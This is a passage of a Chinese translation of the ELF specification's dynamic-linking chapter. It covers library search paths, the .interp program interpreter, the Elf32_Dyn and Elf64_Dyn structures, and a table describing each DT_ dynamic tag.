Connecting)引用的共享目标文件及其依赖项，动态链接器构建完整的进程映像(Process Image)。解析符号引用(Symbolic References)时，动态链接器使用广度优先搜索(Breadth-First Search)检查符号表。也就是说，它首先查看可执行程序本身的符号表，然后查看DT_NEEDED条目所指示的共享目标文件的符号表(按顺序)，然后查看第二级DT_NEEDED条目，依此类推。共享目标文件必须可由进程读取；不需要其他权限。</p><blockquote><p>注释：即使在依赖项列表(Dependency List)中多次引用共享目标文件(Shared Object)，动态链接器也只会将目标文件连接到进程一次。</p></blockquote><p>&emsp;&emsp;依赖项列表中的名称是DT_SONAME字符串或用于构建目标文件的共享目标文件的路径名的副本。例如，如果链接器使用一个共享目标文件(DT_SONAME项为lib1)和另一个共享目标文件(路径名为/usr/lib/lib2)构建一个可执行文件，则该可执行文件将包含lib1和/usr/lib/lib2在它的依赖列表中。</p><p>&emsp;&emsp;如果共享目标文件名称在名称中的任何位置包含一个或多个斜杠(/)字符，例如上面的/usr/lib/lib2或目录/文件，则动态链接器直接使用该字符串作为路径名。如果名称没有斜线(/)，例如上面的lib1，则有三个条件(Facilities)指定了共享目标文件路径搜索，其优先级如下： </p><ul><li>首先，.dynamic数组的标签DT_RPATH可能会给出一个包含目录列表的字符串，以冒号(:)分隔。例如，字符串“/home/dir/lib:/home/dir2/lib:”告诉动态链接器首先搜索目录“/home/dir/lib”，然后是“/home/dir2/lib”，然后是当前目录来查找依赖关系。</li><li>其次，进程环境中名为LD_LIBRARY_PATH的变量[参见exec(BA_OS)]可能包含上述目录列表，可选地后跟一个分号(;)和另一个目录列表。以下值与前面的示例等效：<ul><li>LD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib:</li><li>LD_LIBRARY_PATH=/home/dir/lib;/home/dir2/lib:</li><li>LD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib:;</li><li>所有LD_LIBRARY_PATH目录都在DT_RPATH目录之后搜索。尽管某些程序(例如：链接器)对分号(;)前后的列表的处理方式不同，但动态链接器不会。然而，动态链接器接受分号表示法，具有上述语义。</li></ul></li><li>最后，如果其他两组目录都未能找到所需的库，则动态链接器会搜索“/usr/lib”。</li></ul><blockquote><p>注释：为了安全起见，动态连接器忽略set-user和set-group ID程序的环境搜索规范(如：LD_LIBRARY_PATH)。但是，它会搜索DT_RPATH目录和/usr/lib。同样的限制也适用于在已安装扩展安全系统的系统上拥有超过最小权限的进程。</p></blockquote><h4 id="5-9-1-interp"><a href="#5-9-1-interp" class="headerlink" title="5.9.1 .interp"></a>5.9.1 .interp</h4><p>&emsp;&emsp;此节包含程序解释器(Program Interpreter)的路径名。如果文件具有包含该节的可加载段(Loadable Segment)，则该节的属性将设置SHF_ALLOC位。否则，该位将不被设置。此节属于SHT_PROGBITS类型。</p><h5 id="5-9-1-1-程序解释器"><a href="#5-9-1-1-程序解释器" class="headerlink" title="5.9.1.1 程序解释器"></a>5.9.1.1 程序解释器</h5><p>&emsp;&emsp;一般来说，参与动态链接(Dynamic Linking)的可执行文件应具有一个段类型为PT_INTERP的程序头元素。在exec(BA_OS)期间，系统从PT_INTERP段提取对应解释器的路径名，并从解释器文件的段创建初始进程映像(Initial Process Image)。也就是说，系统为解释器(Interpreter)构建一个内存映像(Memory Image)，而不是使用原始的可执行文件的段映像(Segment Images)。然后解释器负责从系统接收控制，并为应用程序提供执行环境。</p><p>解释器(Interpreter)可能有两种方式获取控制权：</p><ul><li>首先，它可能会接收一个指向文件开头的文件描述符(File Descriptor)来读取可执行文件。它可以使用这个文件描述符来读取(Read)和/或映射(Map)可执行文件的段(Segments)到内存中。</li><li>其次，根据可执行文件格式的不同，系统可能会将可执行文件加载到内存中，而不是给解释器一个打开的文件描述符。虽然文件描述符可能会出现异常，但是解释器的初始进程状态(Initial Process State)仍然会与可执行文件可能接收到的状态相匹配。解释器本身可能不需要再有一个解释器。</li></ul><p>解释器可以是共享目标文件(Shared Object)或可执行文件(Executable File)。</p><ul><li>共享目标文件(Shared Object)(正常情况)解释器被加载为位置无关(Position Independent)，地址可能因进程而异；系统在mmap(KE_OS)和相关服务使用的动态段区域(Dynamic Segment Area)中创建解释器的段。因此，共享目标文件解释器通常不会与原始可执行文件的原始段地址冲突。</li><li>可执行文件(Executable File)解释器一般会被加载到固定地址(Fixed Addresses)；系统使用程序头表(Program Header Table)中的虚拟地址(p_vaddr)创建它的段。因此，可执行文件解释器的虚拟地址可能与第一个可执行文件发生冲突；解释器负责解决冲突。</li></ul><h4 id="5-9-2-dynamic"><a href="#5-9-2-dynamic" class="headerlink" title="5.9.2 .dynamic"></a>5.9.2 .dynamic</h4><p>&emsp;&emsp;此节保存动态链接信息。该节的属性将设置SHF_ALLOC位。是否设置SHF_WRITE位是特定于处理器的。此节属于SHT_DYNAMIC类型。</p><p>&emsp;&emsp;如果一个目标文件(Object File)参与到动态链接(Dynamic Linking)的过程中，它的程序头表(Program Header Table)将有一个类型为PT_DYNAMIC的元素。这个“段(Segment)”包含.dynamic节。一般使用特殊符号_DYNAMIC标记包含以下结构体数组的节：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Swordd_tag;    <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        Elf32_Word d_val;<span class="comment">/* Integer value */</span></span><br><span class="line">        Elf32_Addr d_ptr;<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"><span class="keyword">extern</span> Elf32_Dyn _DYNAMIC[];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Sxwordd_tag;<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        Elf64_Xword d_val;    <span class="comment">/* Integer value */</span></span><br><span class="line">        Elf64_Addr d_ptr;<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"><span class="keyword">extern</span> Elf64_Dyn _DYNAMIC[];</span><br></pre></td></tr></table></figure><p>其中，d_tag的取值决定了该如何解释d_un。</p><ul><li>d_val：这个字段表示一个整数值，可以有多种解释。</li><li>d_ptr：这个字段表示程序虚拟地址(Program Virtual Addresses)。如前所述，文件的虚拟地址(File’s Virtual Addresses)在执行期间可能与内存的虚拟地址(Memory Virtual Addresses)不匹配。当解释动态结构(Dynamic Structure)中包含的地址时，动态链接器(Dynamic Linker)根据原始文件值(Original File Value)以及内存的基地址(Memory Base Address)计算实际地址。为了保持一致性，文件不包含“纠正”动态结构中的地址的重定位条目。</li></ul><p>&emsp;&emsp;下表总结了可执行文件(Executable Files)和共享目标文件(Shared Object Files)的标签(d_tag)要求。如果标签(d_tag)被标记为“强制(Mandatory)”，则符合TIS ELF的文件的动态链接数组(Dynamic Linking Array)必须具有该类型的条目。同样，“可选(Optional)”意味着动态链接数组的该标签条目可能出现但不是必需的。</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:center">d_un</th><th style="text-align:center">可执行文件</th><th style="text-align:center">共享目标文件</th></tr></thead><tbody><tr><td style="text-align:left">DT_NULL</td><td style="text-align:center">0</td><td style="text-align:center">Ignored</td><td style="text-align:center">Mandatory</td><td style="text-align:center">Mandatory</td></tr><tr><td style="text-align:left">DT_NEEDED</td><td style="text-align:center">1</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_PLTRELSZ</td><td style="text-align:center">2</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_PLTGOT</td><td style="text-align:center">3</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_HASH</td><td style="text-align:center">4</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Mandatory</td><td style="text-align:center">Mandatory</td></tr><tr><td style="text-align:left">DT_STRTAB</td><td style="text-align:center">5</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Mandatory</td><td style="text-align:center">Mandatory</td></tr><tr><td style="text-align:left">DT_SYMTAB</td><td style="text-align:center">6</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Mandatory</td><td style="text-align:center">Mandatory</td></tr><tr><td style="text-align:left">DT_RELA</td><td style="text-align:center">7</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Mandatory</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_RELASZ</td><td style="text-align:center">8</td><td style="text-align:center">d_val</td><td style="text-align:center">Mandatory</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_RELAENT</td><td style="text-align:center">9</td><td style="text-align:center">d_val</td><td style="text-align:center">Mandatory</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_STRSZ</td><td style="text-align:center">10</td><td style="text-align:center">d_val</td><td style="text-align:center">Mandatory</td><td style="text-align:center">Mandatory</td></tr><tr><td style="text-align:left">DT_SYMENT</td><td style="text-align:center">11</td><td style="text-align:center">d_val</td><td style="text-align:center">Mandatory</td><td style="text-align:center">Mandatory</td></tr><tr><td style="text-align:left">DT_INIT</td><td style="text-align:center">12</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_FINI</td><td style="text-align:center">13</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_SONAME</td><td style="text-align:center">14</td><td style="text-align:center">d_val</td><td style="text-align:center">Ignored</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_RPATH</td><td style="text-align:center">15</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_SYMBOLIC</td><td style="text-align:center">16</td><td style="text-align:center">Ignored</td><td style="text-align:center">Ignored</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_REL</td><td style="text-align:center">17</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Mandatory</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_RELSZ</td><td style="text-align:center">18</td><td style="text-align:center">d_val</td><td style="text-align:center">Mandatory</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_RELENT</td><td style="text-align:center">19</td><td style="text-align:center">d_val</td><td style="text-align:center">Mandatory</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_PLTREL</td><td style="text-align:center">20</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_DEBUG</td><td style="text-align:center">21</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Ignored</td></tr><tr><td style="text-align:left">DT_TEXTREL</td><td style="text-align:center">22</td><td style="text-align:center">Ignored</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_JMPREL</td><td style="text-align:center">23</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_BIND_NOW</td><td style="text-align:center">24</td><td style="text-align:center">Ignored</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_INIT_ARRAY</td><td style="text-align:center">25</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_FINI_ARRAY</td><td style="text-align:center">26</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_INIT_ARRAYSZ</td><td style="text-align:center">27</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_FINI_ARRAYSZ</td><td style="text-align:center">28</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_RUNPATH</td><td style="text-align:center">29</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_FLAGS</td><td style="text-align:center">30</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_ENCODING</td><td style="text-align:center">32</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td></tr><tr><td style="text-align:left">DT_PREINIT_ARRAY</td><td style="text-align:center">32</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Ignored</td></tr><tr><td style="text-align:left">DT_PREINIT_ARRAYSZ</td><td style="text-align:center">33</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Ignored</td></tr><tr><td style="text-align:left">DT_SYMTAB_SHNDX</td><td style="text-align:center">34</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_MAXPOSTAGS</td><td style="text-align:center">34</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td></tr><tr><td style="text-align:left">DT_NUM</td><td style="text-align:center">35</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td></tr><tr><td style="text-align:left">DT_LOOS</td><td style="text-align:center">0x6000000D</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td></tr><tr><td style="text-align:left">DT_HIOS</td><td style="text-align:center">0x6FFFF000</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td></tr><tr><td style="text-align:left">DT_VALRNGLO</td><td style="text-align:center">0x6FFFFD00</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td></tr><tr><td style="text-align:left">DT_GNU_PRELINKE</td><td style="text-align:center">0x6FFFFDF5</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_GNU_CONFLICTSZ</td><td style="text-align:center">0x6FFFFDF6</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_GNU_LIBLISTSZ</td><td style="text-align:center">0x6FFFFDF7</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_CHECKSUM</td><td style="text-align:center">0x6FFFFDF8</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_PLTPADSZ</td><td style="text-align:center">0x6FFFFDF9</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_MOVEENT</td><td style="text-align:center">0x6FFFFDFA</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_MOVESZ</td><td style="text-align:center">0x6FFFFDFB</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_FEATURE_1</td><td style="text-align:center">0x6FFFFDFC</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_POSFLAG_1</td><td style="text-align:center">0x6FFFFDFD</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_SYMINSZ</td><td style="text-align:center">0x6FFFFDFE</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_SYMINENT</td><td style="text-align:center">0x6FFFFDFF</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_VALRNGHI</td><td style="text-align:center">0x6FFFFDFF</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td></tr><tr><td style="text-align:left">DT_ADDRRNGLO</td><td style="text-align:center">0x6FFFFE00</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td></tr><tr><td style="text-align:left">DT_GNU_HASH</td><td style="text-align:center">0x6FFFFEF5</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_TLSDESC_PLT</td><td style="text-align:center">0x6FFFFEF6</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_TLSDESC_GOT</td><td style="text-align:center">0x6FFFFEF7</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_GNU_CONFLICT</td><td style="text-align:center">0x6FFFFEF8</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_GNU_LIBLIST</td><td style="text-align:center">0x6FFFFEF9</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_CONFIG</td><td style="text-align:center">0x6FFFFEFA</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_DEPAUDIT</td><td style="text-align:center">0x6FFFFEFB</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_AUDIT</td><td style="text-align:center">0x6FFFFEFC</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_PLTPAD</td><td style="text-align:center">0x6FFFFEFD</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_MOVETAB</td><td style="text-align:center">0x6FFFFEFE</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_SYMINFO</td><td style="text-align:center">0x6FFFFEFF</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_ADDRRNGHI</td><td style="text-align:center">0x6FFFFEFF</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td></tr><tr><td style="text-align:left">DT_VERSYM</td><td style="text-align:center">0x6FFFFFF0</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_RELACOUNT</td><td style="text-align:center">0x6FFFFFF9</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_RELCOUNT</td><td style="text-align:center">0x6FFFFFFA</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_FLAGS_1</td><td style="text-align:center">0x6FFFFFFB</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_VERDEF</td><td style="text-align:center">0x6FFFFFFC</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_VERDEFNUM</td><td style="text-align:center">0x6FFFFFFD</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_VERNEED</td><td style="text-align:center">0x6FFFFFFE</td><td style="text-align:center">d_ptr</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_VERNEEDNUM</td><td style="text-align:center">0x6FFFFFFF</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_LOPROC</td><td style="text-align:center">0x70000000</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td></tr><tr><td style="text-align:left">DT_SPARC_REGISTER</td><td style="text-align:center">0x70000001</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_AUXILIARY</td><td style="text-align:center">0x7FFFFFFD</td><td style="text-align:center">d_val</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_USED</td><td style="text-align:center">0x7FFFFFFE</td><td style="text-align:center">d_val</td><td style="text-align:center">Optional</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_FILTER</td><td style="text-align:center">0x7FFFFFFF</td><td style="text-align:center">d_val</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Optional</td></tr><tr><td style="text-align:left">DT_HIPROC</td><td style="text-align:center">0x7FFFFFFF</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td><td style="text-align:center">Unspecified</td></tr></tbody></table><p><code>DT_NULL</code>：带有DT_NULL标签的_DYNAMIC[]数组条目标志着_DYNAMIC[]数组的结束。<br><code>DT_NEEDED</code>：d_val。此元素保存所需库(Needed Library)的名称字符串(以Null结尾的字符串)在字符串表(.dynstr)中的字节偏移量。偏移量(Offset)是记录在DT_STRTAB条目中的字符串表(.dynstr)的索引。有关这些名称的更多信息，请参阅“共享目标文件依赖”。_DYNAMIC[]数组可能包含多个具有此类型的条目。这些条目的相对顺序很重要，但它们与其他类型条目的关系并不重要。<br><code>DT_PLTRELSZ</code>：d_val。此元素保存与过程链接表(Procedure Linkage Table)关联的重定位条目的总大小(以字节为单位)，也就是.rel.plt节的大小。如果存在DT_JMPREL类型的条目，则必须附带一个DT_PLTRELSZ类型的条目。<br><code>DT_PLTGOT</code>：d_ptr。此元素保存与过程链接表(Procedure Linkage Table)和/或全局偏移表(Global Offset Table)相关联的节(.got.plt)的地址。<br><code>DT_HASH</code>：d_ptr。此元素保存符号哈希表(Symbol Hash Table，.hash)节的地址。此哈希表引用DT_SYMTAB元素引用的符号表(.dynsym)。<br><code>DT_STRTAB</code>：d_ptr。此元素保存字符串表(.dynstr)的地址。符号名称(Symbol Names)、库名称(Library Names)和其他字符串位于该表中。<br><code>DT_SYMTAB</code>：d_ptr。此元素保存符号表(.dynsym)的地址。<br><code>DT_RELA</code>：d_ptr。此元素保存重定位表(.rela.dyn)的地址。表中的条目具有显式加数(Explicit Addends)，例如：32位ELF文件使用Elf32_Rela结构。一个目标文件(Object File)可能有多个重定位节(Relocation Sections)。当为可执行文件(Executable Files)或共享目标文件(Shared Object Files)构建重定位表(Relocation Table)时，链接器(Link Editor)将这些节连接起来以形成单个表。尽管这些节在目标文件中保持独立，但动态链接器(Dynamic Linker)看到的是单个表。当动态链接器为可执行文件创建进程映像(Process Image)或向进程映像添加共享目标文件时，它会读取重定位表并执行相关操作。如果存在此元素，则_DYNAMIC[]数组还必须具有DT_RELASZ和DT_RELAENT元素。当重定位对于文件是“强制的(Mandatory)”时，DT_RELA和DT_REL元素只有一个会存在(两者都是允许的，但不是必需的)。<br><code>DT_RELASZ</code>：d_val。此元素保存DT_RELA元素指向的重定位表(.rela.dyn)的总大小，以字节为单位。<br><code>DT_RELAENT</code>：d_val。此元素保存DT_RELA元素指向的重定位表(.rela.dyn)的重定位条目(Elfxx_Rela)的大小，以字节为单位。<br><code>DT_STRSZ</code>：d_val。此元素保存字符串表(.dynstr)的大小，以字节为单位。<br><code>DT_SYMENT</code>：d_val。此元素保存符号表条目(Elfxx_Sym)的大小，以字节为单位。<br><code>DT_INIT</code>：d_ptr。此元素保存初始化函数(Initialization Function)的地址，也是.init节的地址。<br><code>DT_FINI</code>：d_ptr。此元素保存终止函数(Termination Function)的地址，也是.fini节的地址。<br><code>DT_SONAME</code>：d_val。此元素保存此共享对象的名称(以Null结尾的字符串)在字符串表(.dynstr)中的字节偏移量。偏移量(Offset)是记录在DT_STRTAB条目中的字符串表(.dynstr)的索引。有关这些名称的更多信息，请参阅“共享目标文件依赖”。<br><code>DT_RPATH</code>：d_val。此元素保存搜索库搜索路径字符串(Search Library Search Path String)(以Null结尾的字符串)在字符串表(.dynstr)中的字节偏移量。在“共享目标文件依赖”中讨论过。偏移量(Offset)是记录在DT_STRTAB条目中的字符串表(.dynstr)的索引。<br><code>DT_SYMBOLIC</code>：此元素在共享目标库(Shared Object Library)中的存在改变了动态链接器(Dynamic Linker)对库内引用的符号的解析算法。动态链接器不是从可执行文件(Executable Files)开始符号搜索，而是从共享目标文件本身开始。如果共享目标文件未能提供引用的符号，则动态链接器会像往常一样搜索可执行文件和其他共享目标文件。<br><code>DT_REL</code>：d_ptr。此元素保存重定位表(.rel.dyn)的地址。此元素与DT_RELA类似，但其表中的条目具有隐式加数(Implicit Addends)，例如：32位ELF文件使用Elf32_Rel结构。如果此元素存在，则_DYNAMIC[]数组还必须具有DT_RELSZ和DT_RELENT元素。<br><code>DT_RELSZ</code>：d_val。此元素保存DT_REL元素指向的重定位表(.rel.dyn)的总大小，以字节为单位。<br><code>DT_RELENT</code>：d_val。此元素保存DT_REL元素指向的重定位表(.rel.dyn)的重定位条目(Elfxx_Rel)的大小，以字节为单位。<br><code>DT_PLTREL</code>：d_val。此元素保存过程链接表(Procedure Linkage Table)所引用的重定位条目的类型。d_val成员根据需要保存DT_REL或DT_RELA的值。过程链接表(Procedure Linkage Table)中的所有重定位必须使用相同的重定位。<br><code>DT_DEBUG</code>：d_ptr。此元素用于调试。本文件中未规定其内容。<br><code>DT_TEXTREL</code>：此元素的缺失意味着任何重定位表项都不应该导致对不可写段(Non-Writable Segment)的修改，如程序头表(Program Header Table)中的段权限所指定的那样。如果此元素存在，一个或多个重定位条目可能会请求对不可写段进行修改，并且动态链接器(Dynamic Linker)可以相应地进行准备。<br><code>DT_JMPREL</code>：d_ptr。此元素如果存在，此条目的d_ptr成员保存仅与过程链接表(Procedure Linkage Table)关联的重定位表[.rel(a).plt]的地址。如果启用了延迟绑定(Lazy Binding)，则分离这些重定位条目可以让动态链接器(Dynamic Linker)在进程初始化期间忽略它们。如果此元素存在，则DT_PLTRELSZ和DT_PLTREL类型的相关元素也必须存在。<br><code>DT_BIND_NOW</code>：此元素如果存在于共享目标文件(Shared Object Files)或可执行文件(Executable Files)中，则该元素指示动态链接器(Dynamic Linker)在将控制转移到程序之前处理包含该元素的目标文件的所有重定位。当通过环境或通过dlopen(BA_LIB)指定时，此元素的存在优先于对该目标文件使用延迟绑定(Lazy Binding)的指示(Directive)。此元素的使用已被DF_BIND_NOW标志取代。<br><code>DT_INIT_ARRAY</code>：d_ptr。此元素保存指向初始化函数的指针数组(.init_array)的地址。此元素还要求存在DT_INIT_ARRAYSZ元素。<br><code>DT_FINI_ARRAY</code>：d_ptr。此元素保存指向终止函数的指针数组(.fini_array)的地址。此元素还要求存在DT_FINI_ARRAYSZ元素。<br><code>DT_INIT_ARRAYSZ</code>：d_val。此元素保存DT_INIT_ARRAY数组(.init_array)的总大小，以字节为单位。<br><code>DT_FINI_ARRAYSZ</code>：d_val。此元素保存DT_FINI_ARRAY数组(.fini_array)的总大小，以字节为单位。<br><code>DT_RUNPATH</code>：d_val。此元素保存库搜索路径字符串(Library Search Path String)(以Null结尾的字符串)在DT_STRTAB指示的字符串表(.dynstr)中的字节偏移量。<br><code>DT_FLAGS</code>：d_val。此元素保存特定于此目标文件的标志值。<br><code>DT_ENCODING</code>：大于等于DT_ENCODING，小于等于DT_LOOS的动态标签值(Dynamic Tag Values)，遵循d_un联合体的解释规则。<br><code>DT_PREINIT_ARRAY</code>：d_ptr。此元素保存指向预初始化函数的指针数组(.preinit_array)的地址。此元素还要求存在DT_PREINIT_ARRAYSZ元素。仅处理包含在可执行文件(Executable Files)中的此数组。如果此数组包含在共享目标文件(Shared Object Files)中，则忽略此数组。<br><code>DT_PREINIT_ARRAYSZ</code>：d_val。此元素保存DT_PREINIT_ARRAY数组(.preinit_array)的总大小，以字节为单位。<br><code>DT_SYMTAB_SHNDX</code>：d_ptr。此元素保存扩展的符号表节索引节(.symtab_shndx)的地址。<br><code>DT_MAXPOSTAGS</code>：正的动态数组标记值(Dynamic Array Tag Values)的数量。<br><code>DT_NUM</code>：动态数组标记值(Dynamic Array Tag Values)的数量。<br><code>DT_LOOS</code>：保留用于特定的操作系统语义的动态数组标记值(Dynamic Array Tag Values)范围的下限。这些值都遵循d_un联合体的解释规则。<br><code>DT_HIOS</code>：保留用于特定的操作系统语义的动态数组标记值(Dynamic Array Tag 